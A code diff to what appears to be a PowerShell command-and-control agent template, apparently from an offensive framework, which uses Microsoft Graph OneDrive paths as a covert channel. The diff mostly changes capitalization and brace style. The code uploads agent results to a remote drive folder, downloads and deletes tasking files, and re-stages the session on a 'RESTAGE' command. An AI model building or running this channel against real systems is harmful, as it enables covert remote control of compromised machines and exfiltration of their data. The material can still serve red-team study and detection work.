@@ -1,5 +1,5 @@
 $Script:TokenObject = @{token="{{ token }}";refresh="{{ refresh_token }}";expires=(Get-Date).addSeconds(3480)};
-$script:GetWebClient = {
+$Script:GetWebClient = {
     $wc = New-Object System.Net.WebClient;
     $wc.Proxy = [System.Net.WebRequest]::GetSystemWebProxy();
     $wc.Proxy.Credentials = [System.Net.CredentialCache]::DefaultCredentials;
@@ -27,7 +27,7 @@ $script:GetWebClient = {
     $wc;
 };
 
-$script:SendMessage = {
+$Script:SendMessage = {
         param($packets)
 
         if($packets) {
@@ -52,51 +52,43 @@ $script:SendMessage = {
 
             $wc = (& $GetWebClient);
             $null = $wc.UploadData("https://graph.microsoft.com/v1.0/drive/root:/$resultsFolder/$($script:SessionID).txt:/content", "PUT", $RoutingPacket);
-            $script:missedChecking = 0;
-            $script:lastseen = get-date;
+            $Script:missedChecking = 0;
+            $Script:lastseen = get-date;
         }
         catch {
             if($_ -match "Unable to connect") {
-                $script:missedCheckins += 1;
+                $Script:missedCheckins += 1;
             }
         }
-    }
-
-$script:lastseen = Get-Date
-$script:GetTask = {
-    try
-    {
+    };
+$Script:lastseen = Get-Date;
+$Script:GetTask = {
+    try {
         $wc = (& $GetWebClient);
 
         $TaskingsFolder = "{{ base_folder }}/{{ taskings_folder }}";
 
         #If we haven't sent a message recently...
-        if ($script:lastseen.addseconds($script:AgentDelay * 2) -lt (get-date))
+        if ($Script:lastseen.addseconds($Script:AgentDelay * 2) -lt (get-date))
         {
             (& $SendMessage -packets "")
         }
-        $script:MissedCheckins = 0;
+        $Script:MissedCheckins = 0;
 
-        $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$( $script:SessionID ).txt:/content");
+        $data = $wc.DownloadData("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($Script:SessionID).txt:/content");
 
-        if ($data -and ($data.length -ne 0))
-        {
-            {
-                $wc = (& $GetWebClient)
-                $null = $wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$( $script:SessionID ).txt", "DELETE", "");
-                if ([system.text.encoding]::utf8.getString($data) -eq "RESTAGE")
-                {
-                    Start-Negotiate -T $script:TokenObject.token -SK $SK -PI $PI -UA $UA;
-                }
-                $Data;
+        if ($data -and ($data.length -ne 0)) {
+            $wc = (& $GetWebClient);
+            $null = $wc.UploadString("https://graph.microsoft.com/v1.0/drive/root:/$TaskingsFolder/$($Script:SessionID).txt", "DELETE", "");
+            if ([system.text.encoding]::utf8.getString($data) -eq "RESTAGE") {
+                Start-Negotiate -T $script:TokenObject.token -SK $SK -PI $PI -UA $UA;
             }
+            $Data;
         }
     }
     catch {
-        if ($_ -match "Unable to connect")
-        {
-            $script:MissedCheckins += 1;
+        if ($_ -match "Unable to connect") {
+            $Script:MissedCheckins += 1;
         }
     }
-}
-
+};
